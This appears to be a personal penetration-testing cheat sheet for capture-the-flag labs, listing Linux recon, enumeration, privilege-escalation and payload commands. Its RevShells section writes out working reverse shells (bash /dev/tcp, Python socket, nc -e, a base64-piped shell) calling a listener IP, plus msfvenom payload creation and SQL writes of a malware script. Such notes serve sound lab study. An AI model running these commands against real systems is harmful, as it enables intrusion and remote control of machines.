# Linux CheatSheet
## General

```bash
find . -type f -name "*.db" 2>/dev/null
#find all files with extension in current dir

md5sum <filename> 
#gets md5 hash of file

find / -type d -name 'postgresql' 2>/dev/null
#finds dirs with name

grep -Rni '.' -e 'something'
#finds all files with "something" in them

awk '{print $1}'
#prints first word of string 

sort -u
#removes duplicates when using cat

cd /var/mail && cd /var/spool/mail
#check for mail

true && echo hi
#hi will be echoed

false && echo hi 
#hi will not be echoed

false/true & echo hi | false/true ; echo hi 
#hi will always be echoed

netstat -tulpn
#lists all ports in use

grep -i something
#case insensitive search

tar -cvf folder.tar.gz folder
#archives folder into tarball for easier movement

tar -xf folder.tar.gz
#unizps tarball

```

${IFS} can be used in place of whitespace when no whitespace allowed

jd-gui used to decompile jar files

## Enumeration

### Ports

```bash
mkdir nmap
nmap -A -T4 -v -oN nmap/initial $IP 
sudo masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0 -oL nmap/masscan
```

Always google open ports, not just services shown/guessed by nmap

if nmap only shows scanning 2 ports with -p- use -Pn

### Subdomains

```bash
hosts
#alias for 'sudo nano /etc/hosts'

ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H "Host:FUZZ.devvortex.htb" -mc 200,204,301,307,401,403,405,500
#fuzzes subdomains

dig axfr @<ip> <hostname>
#gets other hostnames from port 53 of server (zone transfer)

amass enum -passive -d <domain>
#scrapes for any records of domain

sublist3r -d <domain>
#searches for subdomains
```

https://crt.sh will show all certificates, can show subdomains


### Subdirectories
```bash

dirsearch -u $URL
gobuster dir -u $URL -w /home/kali/directory-list-2.3-medium.txt

wpscan --url <url> -v -e 

```

gitdump used to dump .git directories 

### Other
```bash
sudo responder -wA -I tun0 -v 
#Spoofs every server imaginable to get info on connection attempts

theHarvester -d <domain> -b bing/intelx | tee "domain.txt"
#will look for any hosts, emails, ips and urls related

cat domain.txt | waybackurls > domainwb.txt
#will list very many waybackurls of all domains in domain.txt

cat domainwb.txt | httprobe > validurls.txt
#will find all urls that will resolve
```

.dockerenv in / means you're in a docker container


## MySQL

```bash
mysql -u <username> -p <database>
#connect to mysql database on machine
show databases;
use <databasename>;
show tables;

```

mysql can usually write into /var/lib/mysql/

SELECT "bashscript" into outfile '/dev/shm/malware.sh';

SELECT from_base64("base64encoded") into outfile '/dev/shm/nothing.txt';

## Postgres
```bash
psql -h <localhost> -U <username> 
```


## RevShells

```bash
bash -i >& /dev/tcp/10.10.15.184/9002 0>&1
export RHOST='10.10.15.184';export RPORT=9002;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\"RHOST\\"),int(os.getenv(\\"RPORT\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\"bash\\")'

nc -e /bin/bash 10.10.15.184 9002
```
Be careful to not rush things. Try using &&, but also run commands (wget, chmod then ./) one at a time. Sometimes RCE doesn't like &&/;/&

```bash
echo "bash -i >& /dev/tcp/10.10.15.59/8000 0>&1" | base64
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC84ODg4IDA+JjE= | base64 -d | bash

which python
which python3

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo #with ctrl-z/backgrounded
fg
export TERM=xterm
reset
```

/home/kali/php-reverse-shell.php is php reverse shell that can be uploaded to php server

For things running on localhost, if you have ssh session then you can forward it to yourself using ~C , then -L 8080:localhost:8080

## PHP

With PHP, can put <?php exec("command"); ?> in a .php file then call it

Or exec("command"); in interactive php

Remember to base encode, and not have + in them as will fuck with url encoding. double base encoding usually works well

Also, when calling .php files try both with and without the extension in web browser...

## PrivEsc

```bash
sudo -l 
#shows any commands to be run as sudo by user
#(scriptmanager : scriptmanager) NOPASSWD: ALL means you can execute any commands as scriptmanager
sudo -u scriptmanager <command>

chmod +x pspy && ./pspy 
#sees all commands run, can find cron run as sudo etc

/home/kali/linpeas.sh 
#good tool for PE enum

env 
#shows env variables, could have creds

uname -a 
#shows linux build, could be vuln

ldd --version
#shows GLIBC version, could be vuln (loonytoonables)

env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
#loonytoonables vuln if returns Segmentation fault (core dumped)

ps aux ww

find / -perm -u=s -type f 2>/dev/null 
#finds suid bit

python2 fallofsudo.py

```

look in all interesting folders, .git, .config, /var/www, /, .local

check /var/www, use ls -la. .env is common php password storage thingie

## Web

https://beautifier.io/ - Use detect packers & obfuscators

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

with basic http auth (website shows popup asking for creds) you can clear prefixing url. ie http://username:password@url.com


## Meterpreter

Staged means normal rev shell. OS/meterpreter/reverse_tcp is staged. It's much smaller, but much more fingerprinted and hard to bypass AV

Unstaged means special meterpreter shell. OS/meterpreter_reverse_tcp is unstaged. Pretty big (150+ KB) but can be obviscated much better

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f <format> -o outfile.exe
#payload creation made easy :)

```

## Python

venv is useful for running python scripts which may have outdated dependancies

```bash
python3 -m venv <environment name>
source <environment name>/bin/activate

pip list 
#should only show 2 libraries, used to confirm

pip install -r requirements.txt
#install requirements in venv

deactivate
#exits venv

```